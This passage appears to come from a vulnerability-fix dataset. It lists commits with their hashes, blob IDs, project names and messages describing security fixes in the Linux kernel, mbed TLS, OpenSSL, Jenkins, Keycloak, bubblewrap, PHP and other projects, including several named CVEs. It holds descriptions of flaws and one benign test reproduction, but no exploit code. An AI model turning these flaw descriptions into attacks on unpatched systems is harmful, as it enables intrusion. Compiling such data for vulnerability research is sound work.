DR7: 0000000000000400 Process swapper (pid: 1, threadinfo ffff88013e79c000, task ffff88013e79b500) Stack: ffff880028203d00 ffffffff813de186 ffffffffffffff02 0000000000000000 <d> 0000000000000000 0000000000000000 0000000000000000 0000000000000098 <d> ffff880028203d70 ffffffff813e0162 ffff880028203d20 ffffffff8103b8ac Call Trace: <IRQ>  [<ffffffff813de186>] serio_interrupt+0x36/0xa0 [<ffffffff813e0162>] i8042_interrupt+0x132/0x3a0 [<ffffffff8103b8ac>] ? kvm_clock_read+0x1c/0x20 [<ffffffff8103b8b9>] ? kvm_clock_get_cycles+0x9/0x10 [<ffffffff810e1640>] handle_IRQ_event+0x60/0x170 [<ffffffff8103b154>] ? kvm_guest_apic_eoi_write+0x44/0x50 [<ffffffff810e3d8e>] handle_edge_irq+0xde/0x180 [<ffffffff8100de89>] handle_irq+0x49/0xa0 [<ffffffff81516c8c>] do_IRQ+0x6c/0xf0 [<ffffffff8100b9d3>] ret_from_intr+0x0/0x11 [<ffffffff81076f63>] ? __do_softirq+0x73/0x1e0 [<ffffffff8109b75b>] ? hrtimer_interrupt+0x14b/0x260 [<ffffffff8100c1cc>] ? call_softirq+0x1c/0x30 [<ffffffff8100de05>] ? do_softirq+0x65/0xa0 [<ffffffff81076d95>] ? irq_exit+0x85/0x90 [<ffffffff81516d80>] ? smp_apic_timer_interrupt+0x70/0x9b [<ffffffff8100bb93>] ? apic_timer_interrupt+0x13/0x20\n\nTo avoid the issue let's change the second check to test whether serio is NULL or not.\n\nAlso, let's take i8042_lock in i8042_start() and i8042_stop() instead of trying to be overly smart and using memory barriers.\n\nSigned-off-by: Chen Hong <chenhong3@huawei.com> [dtor: take lock in i8042_start()/i8042_stop()] Cc: stable@vger.kernel.org Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>

======================================================================
Commit With Fix: 
    83c9f495ffe70c7dd280b41fdfd4881485a3bc28
File(s) In Commit: 
    library/ssl_srv.c
Blob(s) In Commit: 
    97d7a9e80be0282d786ea46ae7a4d777ea9440e9
Blob(s) Before Fix: 
    f137c3dce61cb6b3d2073f977cf8e26b84e07fda
Projects:
    007h_mbed
Commit Message for 83c9f495ffe70c7dd280b41fdfd4881485a3bc28:
Prevent bounds check bypass through overflow in PSK identity parsing\n\nThe check `if( *p + n > end )` in `ssl_parse_client_psk_identity` is unsafe because `*p + n` might overflow, thus bypassing the check. As `n` is a user-specified value up to 65K, this is relevant if the library happens to be located in the last 65K of virtual memory.\n\nThis commit replaces the check by a safe version.

======================================================================
Commit With Fix: 
    0cb5ba0f6e83162d221681f47b470c3042eef237
File(s) In Commit: 
    saml-core/src/main/java/org/keycloak/saml/common/util/StaxParserUtil.java
Blob(s) In Commit: 
    c446f6dfcdf06345032bab836d706b6f94b8f0e9
Blob(s) Before Fix: 
    1b06e9d70722cda34b52768493603674e9a07a49
Projects:
    01epa_keycloak
    0x6a77_swagger-codegen
Commit Message for 0cb5ba0f6e83162d221681f47b470c3042eef237:
KEYCLOAK-4160

======================================================================
Commit With Fix: 
    33ab91103b3415e12457e3104f0e4517ce12d0f3
File(s) In Commit: 
    arch/x86/kvm/emulate.c
Blob(s) In Commit: 
    cedbba0f3402d2343ce069fe3ed6a07f44f68907
Blob(s) Before Fix: 
    106c01557f2b63706eca28e462a3b072b590f0c5
    38d3751472e451fec11a65552fff180d38e5a085
    4e95d3eb29557bcb99219fddb7b909e23ff3b090
    56628a44668b7ec43cee087af817ebb1725cf7cd
    8fa2ac8b4814310a78ef6705c1a15345b208398f
    9da95b9daf8deb83af606ae0fffb73f7fab74ff2
    9f676adcdfc20bc9e7af0c421e31f7978cdbd263
    a2f24af3c999ca5f14c553bf5e9875725c47668a
    a3ce9d260d68756fa675ce40994b79aedd206413
    b9b09fec173bf2fedb0b9ee122b3c4668eb6e471
    cbd7b92585bbbaabad95811f2a139e24283a4c35
    f36d0fa6b8854ef562ff84c4692e55fd43844533
Projects:
    0-T-0_ps4-linux
Commit Message for 33ab91103b3415e12457e3104f0e4517ce12d0f3:
KVM: x86: fix emulation of "MOV SS, null selector"\n\nThis is CVE-2017-2583.  On Intel this causes a failed vmentry because SS's type is neither 3 nor 7 (even though the manual says this check is only done for usable SS, and the dmesg splat says that SS is unusable!). On AMD it's worse: svm.c is confused and sets CPL to 0 in the vmcb.\n\nThe fix fabricates a data segment descriptor when SS is set to a null selector, so that CPL and SS.DPL are set correctly in the VMCS/vmcb. Furthermore, only allow setting SS to a NULL selector if SS.RPL < 3  this in turn ensures CPL < 3 because RPL must be equal to CPL.\n\nThanks to Andy Lutomirski and Willy Tarreau for help in analyzing the bug and deciphering the manuals.\n\nReported-by: Xiaohan Zhang <zhangxiaohan1@huawei.com> Fixes: 79d5b4c3cd809c770d4bf9812635647016c56011 Cc: stable@nongnu.org Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    129a72a0d3c8e139a04512325384fe5ac119e74d
File(s) In Commit: 
    arch/x86/kvm/emulate.c
Blob(s) In Commit: 
    f36d0fa6b8854ef562ff84c4692e55fd43844533
Blob(s) Before Fix: 
    56628a44668b7ec43cee087af817ebb1725cf7cd
Projects:
    0-T-0_ps4-linux
Commit Message for 129a72a0d3c8e139a04512325384fe5ac119e74d:
KVM: x86: Introduce segmented_write_std\n\nIntroduces segemented_write_std.\n\nSwitches from emulated reads/writes to standard read/writes in fxsave, fxrstor, sgdt, and sidt.  This fixes CVE-2017-2584, a longstanding kernel memory leak.\n\nSince commit 283c95d0e389 ("KVM: x86: emulate FXSAVE and FXRSTOR", 2016-11-09), which is luckily not yet in any final release, this would also be an exploitable kernel memory *write*!\n\nReported-by: Dmitry Vyukov <dvyukov@google.com> Cc: stable@vger.kernel.org Fixes: 96051572c819194c37a8367624b285be10297eca Fixes: 283c95d0e3891b64087706b344a4b545d04a6e62 Suggested-by: Paolo Bonzini <pbonzini@redhat.com> Signed-off-by: Steve Rutherford <srutherford@google.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    307ed31caba68a46426b8c73a787a05add2c7489
File(s) In Commit: 
    war/src/main/webapp/scripts/hudson-behavior.js
Blob(s) In Commit: 
    77a4c41b34e38a47919c51fb9a49a206f766bca7
Blob(s) Before Fix: 
    22d85fd27ed9d36f40daf4d4267849a787b00e9f
Projects:
    01user_jenkins
Commit Message for 307ed31caba68a46426b8c73a787a05add2c7489:
Merge pull request #98 from jenkinsci-cert/SECURITY-388\n\n[SECURITY-388] Escape metacharacters in the search box

======================================================================
Commit With Fix: 
    97a61a9fe55f4c16168c123f98301a5173b9fa86
File(s) In Commit: 
    core/src/main/java/jenkins/model/Jenkins.java
Blob(s) In Commit: 
    5d4532700756a11b8688726588c6047c43d0c10a
Blob(s) Before Fix: 
    65a5c9ebcfa9a3f2e43922d73e0ee2d56c2f9046
Projects:
    01user_jenkins
Commit Message for 97a61a9fe55f4c16168c123f98301a5173b9fa86:
Merge pull request #99 from jenkinsci-cert/SECURITY-389\n\n[SECURITY-389] Check ADMINISTER on /fingerprintCleanup and /workspaceCleanup

======================================================================
Commit With Fix: 
    dffab154d29a288aa171ff50263ecc8f2e14a891
File(s) In Commit: 
    login-utils/su-common.c
Blob(s) In Commit: 
    696adc8888ad901efbb98f7878c31e4a21c4cf27
Blob(s) Before Fix: 
    5aefd3fff0a1d489f479b41b8881dd2b15686dba
Projects:
    0e318236-1680-41a8-a989-3c9227637cdf_util-linux
Commit Message for dffab154d29a288aa171ff50263ecc8f2e14a891:
su: properly clear child PID\n\nReported-by: Tobias Stöckmann <tobias@stoeckmann.org> Signed-off-by: Karel Zak <kzak@redhat.com>

======================================================================
Commit With Fix: 
    000030feb7a30f193197f1aab8a7b04a26b42735
File(s) In Commit: 
    src/auth/db-dict.c
Blob(s) In Commit: 
    a4c3b53ce7b572727818b44d2241826201b0fd3e
Blob(s) Before Fix: 
    3a9f03d70bdfa1520e505847363fcba537f6608c
    4559e556e78fbffb7886c43434fa4b4abda6a9da
    50f9f306d49c17f4f28d523a971b9722c98aa378
    89d44d2118102ca3344215b4e496952d230d4df8
    9f395f9a664698f01d7ab03df14a413420867ed4
Projects:
    001101_server
Commit Message for 000030feb7a30f193197f1aab8a7b04a26b42735:
auth: Do not double-expand key in passdb dict when authenticating\n\nBroken by 79042f8c

======================================================================
Commit With Fix: 
    43a6684519ab0a6c52024b5e25322476cabad893
File(s) In Commit: 
    net/ipv4/ping.c
Blob(s) In Commit: 
    ccfbce13a6333a65dab64e4847dd510dfafb1b43
Blob(s) Before Fix: 
    044a0ddf6a791ace04fbb1802e64563bf3fc5518
    05ff44b758dfee1e02996a3726ac63854a96ad16
    205e2000d3950d16b22d5fd16f5ad3289f09c712
    208d5439e59b2e8c3ccb2da46c292ad4f75b3784
    242e7f4ed6f44ff5765966388618152e2721fa87
    2af6244b83e27ae384e96cf071c10c5a89674804
    2d11c094296e77ceb36b4121df01d7e5318de591
    2e91006d6076492fb0fe3b0bdf831c42bca56756
    2ed64bca54e351e1ab51f7604b65ac72cbfb8e59
    51e2f3c5e954d81b236cfffc034cc920cdb07319
    561b0d84bbaaeeed30e033e2ca708ca1ab28f333
    57f7c98041394998fe390735aa5b8cd2602b3f90
    5b2635e69a926899f05e2dad4c0fdb10a95acc76
    5d740cccf69ec29d9778ddb0568c726266904ce9
    66ddcb60519a169c02b4f5041d1bf1df731763b8
    68d77b1f1495bb8dace1f6aa9c0e9a6ee5b2e5dd
    7cf7d6e380c2c87ecccb11bae3f677676062d11f
    86cca610f4c2c368476dee3602d1f74ac2cd5794
    96b8e2b957313d36c0c6d339fb21754d71d691ea
    a3c59a077a5f0574f02584b0068de0703d5cb3dc
    b8f0db54b1978c800c1f606e0d06a015499a2972
    c0d82f78d364fe5561f819f953e3eb48d2f134da
    cf9700b1a1061404abb62c906afac1cacb43657a
    d3a27165f9cca0f20f68616295cfbf683fb4adc0
    d7d9882d4caea169964a58e294ffe6c73a99d36c
    e612991c91857152f0950251236e997f7439c7bb
    e89094ab5ddb8ce2b6eb2d78a9a9046b42287bd5
    e9f66e1cda507cf2d5cb532958d23a89beeccaba
Projects:
    0-T-0_ps4-linux
Commit Message for 43a6684519ab0a6c52024b5e25322476cabad893:
ping: implement proper locking\n\nWe got a report of yet another bug in ping\n\nhttp://www.openwall.com/lists/oss-security/2017/03/24/6\n\n->disconnect() is not called with socket lock held.\n\nFix this by acquiring ping rwlock earlier.\n\nThanks to Daniel, Alexander and Andrey for letting us know this problem.\n\nFixes: c319b4d76b9e ("net: ipv4: add IPPROTO_ICMP socket kind") Signed-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Daniel Jiang <danieljiang0415@gmail.com> Reported-by: Solar Designer <solar@openwall.com> Reported-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    a70934eea95c76a7737b83773bffe8738935082d
File(s) In Commit: 
    lib/ofx_preproc.cpp
Blob(s) In Commit: 
    f07f2749232bc51da938b972ca09449d6dc1d941
Blob(s) Before Fix: 
    30e0d8cc81d08d595245c73bea7e025876d3f0be
Projects:
    daissi_libofx
Commit Message for a70934eea95c76a7737b83773bffe8738935082d:
Fix a buffer overflow.\n\nThis is only the minimum workaround to prevent buffer overflow: Stop iterating once the (fixed!) size of the output buffers is reached. In response to https://www.talosintelligence.com/vulnerability_reports/TALOS-2017-0317\n\nHowever, this code is a huge mess anyway and is in no way anything like up-to-date C++ code. Please, anyone, replace it with something more modern. Thanks.

======================================================================
Commit With Fix: 
    898fb884b706aaeb283de4812340bb0bde8476dc
File(s) In Commit: 
    ssl/ssl.h
Blob(s) In Commit: 
    3cf96a239bab448cb58d838f1d699604ec5010a3
Blob(s) Before Fix: 
    105047ee4d5e7e5c87248b91f310b2715978a0b4
    114ee97c763bf4ec22902fa3fbab720fbcde779e
    1cb3462f4854952071d3a795eb703d32e329bcfd
    2e067e7a78e468909984ffc12c6eabd50b1e22d4
    3511442c0b0c278badb14212ac9b7b604bb3d39a
    4bc1f4e60b8b8ad901a85bf89e6d245f86ef4ddd
    4c1242c9d20c56b4d18978ae76c278b29b79d4a4
    593579ed367082609bece19734eb95b8a6763cb9
    5ef56faa509903c771a42acfbf7443ea7ae54687
    640fb639fa4ea1381cafcbe917e555bd46334fa1
    68c13d4c9789e316fd82a92ede1cafdf4640960e
    6df921f3c18360c96c6ac4c492dd443d1bb5cb36
    6f0f361d7e6c05a24c67ffb2ab4c0be21ee7ff6d
    7219a0e64bc23b2c494fa163a9b25619a53cd6c9
    76771c9c00ef85fde7ac62b3541f8aad43ec3438
    825490b5c24e0c1339b271843c32e63518651e26
    90aeb0ce4e1ead55327433257a38765024865bc4
    9e6d00a4614754e2ab3e760175f11e9822eff7f3
    ae8c92575e03e028e3deb2f78ddf783a9cf1cd37
    b8456c692bd946217ec19a6fa2e00cd645b0954a
    bab3ee66ebccac367969a38a6ec8c36c6a4f6674
    e87d9be8fc66369c648ce11b01f2c954e8b456d4
Projects:
    0902710055_openssl
Commit Message for 898fb884b706aaeb283de4812340bb0bde8476dc:
Don't allow read/write after fatal error\n\nOpenSSL 1.0.2 (starting from version 1.0.2b) introduced an "error state" mechanism. The intent was that if a fatal error occurred during a handshake then OpenSSL would move into the error state and would immediately fail if you attempted to continue the handshake. This works as designed for the explicit handshake functions (SSL_do_handshake(), SSL_accept() and SSL_connect()), however due to a bug it does not work correctly if SSL_read() or SSL_write() is called directly. In that scenario, if the handshake fails then a fatal error will be returned in the initial function call. If SSL_read()/SSL_write() is subsequently called by the application for the same SSL object then it will succeed and the data is passed without being decrypted/encrypted directly from the SSL/TLS record layer.\n\nIn order to exploit this issue an attacker would have to trick an application into behaving incorrectly by issuing an SSL_read()/SSL_write() after having already received a fatal error.\n\nThanks to David Benjamin (Google) for reporting this issue and suggesting this fix.\n\nCVE-2017-3737\n\nReviewed-by: Rich Salz <rsalz@openssl.org>

======================================================================
Commit With Fix: 
    ba27c91351878bc297ec4baba0bd488a2f3b568d
File(s) In Commit: 
    src/backend/BSHTTP.pm
Blob(s) In Commit: 
    928b88a992284afa3f6ea1cfdeae0605ea8943c4
Blob(s) Before Fix: 
    d91de76b0a05a925faaddfa3bdf4170882782839
Projects:
    Abdelhamidhenni_open-build-service
Commit Message for ba27c91351878bc297ec4baba0bd488a2f3b568d:
[backend] only allow plain files in cpio_sender\n\nNo devices, sockets, directories, symlinks please...

======================================================================
Commit With Fix: 
    3a55ddd3c4c11ce75a86afbefd085d8d397ff957
File(s) In Commit: 
    src/base64.c
Blob(s) In Commit: 
    ba8accab7a271f7ca87c75fb192d107000572b4a
Blob(s) Before Fix: 
    7870a79ec812e0966c2e2b010e5ff35df0ff4c6e
Projects:
    0neday_libimobiledevice
Commit Message for 3a55ddd3c4c11ce75a86afbefd085d8d397ff957:
base64: Rework base64decode to handle split encoded data correctly

======================================================================
Commit With Fix: 
    d7fc532c42f0e9bf427923bab85433282b3e5117
File(s) In Commit: 
    bubblewrap.c
Blob(s) In Commit: 
    4b5b8e659b3efa3327283c8b45a9edabc187dc16
Blob(s) Before Fix: 
    6e044593b92b68f6a0426a6e877e8942ef5e31f4
Projects:
    4144_bubblewrap
Commit Message for d7fc532c42f0e9bf427923bab85433282b3e5117:
Call setsid() before executing sandboxed code (CVE-2017-5226)\n\nThis prevents the sandboxed code from getting a controlling tty, which in turn prevents it from accessing the TIOCSTI ioctl and hence faking terminal input.\n\nFixes: #142\n\nCloses: #143 Approved by: cgwalters

======================================================================
Commit With Fix: 
    4cc0286f2f3780abc6084bcdae5dce595daa3c12
File(s) In Commit: 
    Zend/zend_hash.c
Blob(s) In Commit: 
    8b54a3932d0ab49ce19531e5083c9c019b14aaed
Blob(s) Before Fix: 
    322422da155b5419a801a35a47bd2e018518ba26
Projects:
    0014593_php-src
Commit Message for 4cc0286f2f3780abc6084bcdae5dce595daa3c12:
Fix #73832 - leave the table in a safe state if the size is too big.

======================================================================
Commit With Fix: 
    26841d9c81f27ad23b2f6e4bd5eaec7f2f58dfe0
File(s) In Commit: 
    inc/files/files.ctrl.php
Blob(s) In Commit: 
    e7ecda94e89aac44848238047a5cecbeb74c8aaa
Blob(s) Before Fix: 
    66a473a5b8e40c87bffc973e04e31ec4f56c084a
Projects:
    Acidburn0zzz_b2evolution
Commit Message for 26841d9c81f27ad23b2f6e4bd5eaec7f2f58dfe0:
Fixed fm_selected parameter exploit

======================================================================
Commit With Fix: 
    9a069e0f2e027ec5138f998023cf9cb62c04889f
File(s) In Commit: 
    MagickCore/profile.c
Blob(s) In Commit: 
    66e742fc9b7bfaef2d1c0c4a41f4d4800bf6afe8
Blob(s) Before Fix: 
    91cbf4fbe93f14441df07a6b26feedc577092c91
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 9a069e0f2e027ec5138f998023cf9cb62c04889f:
https://github.com/ImageMagick/ImageMagick/issues/354

======================================================================
Commit With Fix: 
    7391a506352c009fe044dead7baad9e22dd279ee
File(s) In Commit: 
    tools/plistutil.c
Blob(s) In Commit: 
    e943e766b05bd7c687d4ae5ec045f287050e361c
Blob(s) Before Fix: 
    645160458e48b5d4a2cc65be5c32d5310da90e94
Projects:
    0neday_libimobiledevice
Commit Message for 7391a506352c009fe044dead7baad9e22dd279ee:
plistutil: Prevent OOB heap buffer read by checking input size\n\nAs pointed out in #87 plistutil would do a memcmp with a heap buffer without checking the size. If the size is less than 8 it would read beyond the bounds of this heap buffer. This commit prevents that.

======================================================================
Commit With Fix: 
    c4e490cf148e85ead0d1b1c2caaba833f1d5b29f
File(s) In Commit: 
    mm/slab.c
Blob(s) In Commit: 
    4f2ec6bb46ebe949d2e19ff154faddc7e2526f02
Blob(s) Before Fix: 
    090fb26b3a39b4feba105650f2a663f5c9972064
    0b0550ca85b40c9108b4085873d67babc200885d
    0b1c2a58559dcdfd7f6bc065a2a3e4f3f7b75e6c
    17e2848979c53a369ad9d7d766d9872173c1787f
    261147ba156fb855c525975a0478d98096c7d0a2
    29bc6c0dedd07020e9f433332f907620239343a5
    32c2296288cc44cdf3fe4da4a39fd731ec54a944
    4fcc5dd8d5a6c2776ac2f88d9011ac23c78fb769
    852fc5c79829b04a2b673e3e2e41de19d8ff55e5
    87b29e76cafdad57eae3a70bf34f1362a4434c53
    b67271024135aff957f1361c3e327da41915b4c2
    bd878f051a3b9bbdd1d520bc934c134b761bb04e
    c4b89eaf4c96416eca9e0e8817628525b5c44a9a
Projects:
    0-T-0_ps4-linux
Commit Message for c4e490cf148e85ead0d1b1c2caaba833f1d5b29f:
mm/slab.c: fix SLAB freelist randomization duplicate entries\n\nThis patch fixes a bug in the freelist randomization code.  When a high random number is used, the freelist will contain duplicate entries.  It will result in different allocations sharing the same chunk.\n\nIt will result in odd behaviours and crashes.  It should be uncommon but it depends on the machines.  We saw it happening more often on some machines (every few hours of running tests).\n\nFixes: c7ce4f60ac19 ("mm: SLAB freelist randomization") Link: http://lkml.kernel.org/r/20170103181908.143178-1-thgarnie@google.com Signed-off-by: John Sperbeck <jsperbeck@google.com> Signed-off-by: Thomas Garnier <thgarnie@google.com> Cc: Christoph Lameter <cl@linux.com> Cc: Pekka Enberg <penberg@kernel.org> Cc: David Rientjes <rientjes@google.com> Cc: Joonsoo Kim <iamjoonsoo.kim@lge.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    6d104af38b570d37aa32a5803b04c354f8ed513d
File(s) In Commit: 
    drivers/hid/hid-corsair.c
Blob(s) In Commit: 
    5971907a23b13db1250264f8a26c214e3c9b748a
Blob(s) Before Fix: 
    717704e9ae07bd97d64f38321d2d49f07de62b83
Projects:
    0-T-0_ps4-linux
Commit Message for 6d104af38b570d37aa32a5803b04c354f8ed513d:
HID: corsair: fix DMA buffers on stack\n\nNot all platforms support DMA to the stack, and specifically since v4.9 this is no longer supported on x86 with VMAP_STACK either.\n\nNote that the macro-mode buffer was larger than necessary.\n\nFixes: 6f78193ee9ea ("HID: corsair: Add Corsair Vengeance K90 driver") Cc: stable <stable@vger.kernel.org> Signed-off-by: Johan Hovold <johan@kernel.org> Signed-off-by: Jiri Kosina <jkosina@suse.cz>

======================================================================
Commit With Fix: 
    05a974efa4bdf6e2a150e3f27dc6fcf0a9ad5655
File(s) In Commit: 
    drivers/net/ieee802154/atusb.c
Blob(s) In Commit: 
    fa3e8c34b26c95a4f57e1c419003a744fe43e4c0
Blob(s) Before Fix: 
    1253f864737ae3cfb10a95ee8c916b5c04dd94b6
Projects:
    0-T-0_ps4-linux
Commit Message for 05a974efa4bdf6e2a150e3f27dc6fcf0a9ad5655:
ieee802154: atusb: do not use the stack for buffers to make them DMA able\n\nFrom 4.9 we should really avoid using the stack here as this will not be DMA able on various platforms. This changes the buffers already being present in time of 4.9 being released. This should go into stable as well.\n\nReported-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable@vger.kernel.org Signed-off-by: Stefan Schmidt <stefan@osg.samsung.com> Signed-off-by: Marcel Holtmann <marcel@holtmann.org>

======================================================================
Commit With Fix: 
    146cc8a17a3b4996f6805ee5c080e7101277c410
File(s) In Commit: 
    drivers/usb/serial/kl5kusb105.c
Blob(s) In Commit: 
    6cb45757818fae2222383358b4d38d7c87b2dbf4
Blob(s) Before Fix: 
    0ee190fc1bf8ce7154a4a4eac7023a377aa03365
    10f05407e535da02e606865b9b7386c73dd4174b
    19373cb7c5bfbe800c0a19bc5aa6be38f60386ae
    1b4054fe52a5fccf85d4be4cbe4cbb3b30ff03b7
    595415e59d5defecb30c33118198687554a96dc0
    5ee48b0650c45f146d92813f76253c3f51a828e2
    6f29bfadbe33dce78ef80d915cc1257bf8bd461f
    7625226fd7dad7cf6a396d84e15a7195fac8736b
    83c823d32ff96e5af5379dba5a5017245a541681
    b6794baf0a3bc732df85a4ccf918b7e25417fd2e
    c88cc4966b23f067e4b443d937f2ee5c15f5cfad
    d7440b7557afde7a643dbf76f8e22eae517bf435
    e020ad28a00c9d566d24143175cb50baf1e07a90
    fc064e1442ca988ae3330388cb4d855f023f1595
    fc5d3a791e08c61fad21ba48292659d1f1924d12
Projects:
    0-T-0_ps4-linux
Commit Message for 146cc8a17a3b4996f6805ee5c080e7101277c410:
USB: serial: kl5kusb105: fix line-state error handling\n\nThe current implementation failed to detect short transfers when attempting to read the line state, and also, to make things worse, logged the content of the uninitialised heap transfer buffer.\n\nFixes: abf492e7b3ae ("USB: kl5kusb105: fix DMA buffers on stack") Fixes: 1da177e4c3f4 ("Linux-2.6.12-rc2") Cc: stable <stable@vger.kernel.org> Reviewed-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org> Signed-off-by: Johan Hovold <johan@kernel.org>

======================================================================
Commit With Fix: 
    b9dc6f65bc5e232d1c05fe34b5daadc7e8bbf1fb
File(s) In Commit: 
    lib/iov_iter.c
Blob(s) In Commit: 
    e68604ae3cedf41ce98bc06de2142629fa115cbd
Blob(s) Before Fix: 
    0cd522753ff5c6830673e6d9f0cb46d70b4c9c23
    228892dabba6f5579478988b84ef007fa04bd661
    25f57230380104f419257ea43c1cd3d2e31d7e65
    5fecddc32b1b47e1c2d7ce9706b9a840995f3d4e
    691a52b634fe4ecadec6afce28cffa448a2f6654
    75232ad0a5e7ead00e5d8396ed34763d84a0685c
    7e3138cfc8c9c72858534b10ed58e4ef4c5e72f7
    9d96e283520cc7f3ec27714dfa4abfcb3800e319
    9e8c7386b3a03e8d418dd09847c9c7f295e06e77
    ca5316e0087b55de6830f6a2abe24e41291015b3
    d67c8288d95dba435bf608b6258c3168c8206d7a
    efb0b4d267a15c9fbfce12a9c3af7fcd8a4cb0d3
    f0c7f1481baeefe30f14820ef9a2782a1541a175
    f2bd21b93dfca464ae24bb18c6492bd8c7f1eb88
Projects:
    0-T-0_ps4-linux
Commit Message for b9dc6f65bc5e232d1c05fe34b5daadc7e8bbf1fb:
fix a fencepost error in pipe_advance()\n\nThe logics in pipe_advance() used to release all buffers past the new position failed in cases when the number of buffers to release was equal to pipe->buffers.  If that happened, none of them had been released, leaving pipe full.  Worse, it was trivial to trigger and we end up with pipe full of uninitialized pages.  IOW, it's an infoleak.\n\nCc: stable@vger.kernel.org # v4.9 Reported-by: "Alan J. Wylie" <alan@wylie.me.uk> Tested-by: "Alan J. Wylie" <alan@wylie.me.uk> Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

======================================================================
Commit With Fix: 
    497de07d89c1410d76a15bec2bb41f24a2a89f31
File(s) In Commit: 
    fs/posix_acl.c
Blob(s) In Commit: 
    c9d48dc784953fa4af62f9af58dfbb56ed2faa70
Blob(s) Before Fix: 
    0855f772cd41599d6c1d1091e7da616d32cccf53
    1da000aabb0898a9fe06daa903c1fa18463098e8
    3a48bb789c9f3e4eb227214f72798b90c52af5dc
    4adde1e2cbece693ebab67527a555e3a33e6fbfa
    4fb17ded7d4780d8d19e7c68cb1c7cedfeb79cf7
    5049afab9fb48c13e625820bf643c0ec9f268e22
    595522022aca04beeeabd3d2ed4e73992f268296
    59d47ab0791af5ce96200c18ecaeee53800cd35a
    5e325a42e33d03bb91d32edeb212ac28fb979ec2
    711dd517037689ac03fa1b31085a72ca010ab314
    84ad1c90d535db8fa333ca77b1c1073f5914e4a1
    84bb65b835701365126833a9e74d9e5d7a8a6c00
    8a4a266beff39dda0be9ca39df74bc847fd0a2d3
    993bb3b5f4d59feed55754855f0262eb251fa633
    a3f86cef76472e7d332e7782c855b21da6b19d1b
    a60d3cc5b55d9190539d07e6869206c986d8a6de
    a9dafa83678ce894bf1af8650ee4be09bfdb3a44
    bfc3ec38832282ca9834bb06379ffc0132e041c5
    cea4623f1ed63007b8da0a8486ac65595415f895
    eebf5f6cf6d5645a128b9b3560ac9ce853a4bdc7
Projects:
    0-T-0_ps4-linux
Commit Message for 497de07d89c1410d76a15bec2bb41f24a2a89f31:
tmpfs: clear S_ISGID when setting posix ACLs\n\nThis change was missed the tmpfs modification in In CVE-2016-7097 commit 073931017b49 ("posix_acl: Clear SGID bit when setting file permissions") It can test by xfstest generic/375, which failed to clear setgid bit in the following test case on tmpfs:\n\n  touch $testfile   chown 100:100 $testfile   chmod 2755 $testfile   _runas -u 100 -g 101 -- setfacl -m u::rwx,g::rwx,o::rwx $testfile\n\nSigned-off-by: Gu Zheng <guzheng1@huawei.com> Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

======================================================================
Commit With Fix: 
    ce5b36e44b714b18b0bcd34c6db0187b8d13bab8
File(s) In Commit: 
    plugins/markdown_plugin/_parsedown.inc.php
Blob(s) In Commit: 
    7aea9f00655159e56eeccc5bc0739f6f569ced4a
Blob(s) Before Fix: 
    01a77f0eebed5025268f088bc7b42c6147c9a9cd
    41550efa13fd4977831e7ff91c38cacd9c2a7dbc
    683e219d035800e1eddf0c8a490aa72c57599382
    9ab2f281d9b1976c3e8eb405a4bceb05cecbf450
    f9998a2daf66eb4461b67fc260baca5425645b13
Projects:
    Acidburn0zzz_b2evolution
Commit Message for ce5b36e44b714b18b0bcd34c6db0187b8d13bab8:
Ignore wrong urls on markdown plugin

======================================================================
Commit With Fix: 
    0f2ff82e11c86c05d051cae32b58226392d33bbf
File(s) In Commit: 
    drivers/gpu/drm/vc4/vc4_gem.c
Blob(s) In Commit: 
    c5fe3554858e513ed30fd8cb8944d34c2b26174d
Blob(s) Before Fix: 
    db920771bfb5641c9d5d8e53a8f73cf7ee501bb7
Projects:
    0-T-0_ps4-linux
Commit Message for 0f2ff82e11c86c05d051cae32b58226392d33bbf:
drm/vc4: Fix an integer overflow in temporary allocation layout.\n\nWe copy the unvalidated ioctl arguments from the user into kernel temporary memory to run the validation from, to avoid a race where the user updates the unvalidate contents in between validating them and copying them into the validated BO.\n\nHowever, in setting up the layout of the kernel side, we failed to check one of the additions (the roundup() for shader_rec_offset) against integer overflow, allowing a nearly MAX_UINT value of bin_cl_size to cause us to under-allocate the temporary space that we then copy_from_user into.\n\nReported-by: Murray McAllister <murray.mcallister@insomniasec.com> Signed-off-by: Eric Anholt <eric@anholt.net> Fixes: d5b1a78a772f ("drm/vc4: Add support for drawing 3D frames.")

======================================================================
Commit With Fix: 
    6b8ac63847bc2f958dd93c09edc941a0118992d9
File(s) In Commit: 
    drivers/gpu/drm/vc4/vc4_gem.c
Blob(s) In Commit: 
    ab3016982466c3ca35ba479050ee107d26eb50ac
Blob(s) Before Fix: 
    18e37171e9c8e2f0729ca1c582af98ccb4647e06
    202aa1544acc7df6b669781764f387daa99dd871
    303f23c962206836d8c95786ad835d7625e10ee8
    46899d6de6753c28c7ca6c721119a28d72792148
    47a095f392f8a7b5443227933c78b500a4c7137f
    6155e8aca1c6490039f14cd8addcf467a7de8eb4
    665b9295f7343ec2b248bab2d23f15f2922f78a6
    8d4384f8b78d2dbe88df720db6df67c0e1a31e53
    b262c5c26f109702572ed613fa0965f06a993ef9
    b608cd463d4e6c01930faed1c0e135704160e7ea
    c5fe3554858e513ed30fd8cb8944d34c2b26174d
    d061be72dd530e05ca2cb038fdc59888718258bf
    d31b3d0c995543bb965464eb148b0036194683b4
    db920771bfb5641c9d5d8e53a8f73cf7ee501bb7
Projects:
    0-T-0_ps4-linux
Commit Message for 6b8ac63847bc2f958dd93c09edc941a0118992d9:
drm/vc4: Return -EINVAL on the overflow checks failing.\n\nBy failing to set the errno, we'd continue on to trying to set up the RCL, and then oops on trying to dereference the tile_bo that binning validation should have set up.\n\nReported-by: Ingo Molnar <mingo@kernel.org> Signed-off-by: Eric Anholt <eric@anholt.net> Fixes: d5b1a78a772f ("drm/vc4: Add support for drawing 3D frames.")

======================================================================
Commit With Fix: 
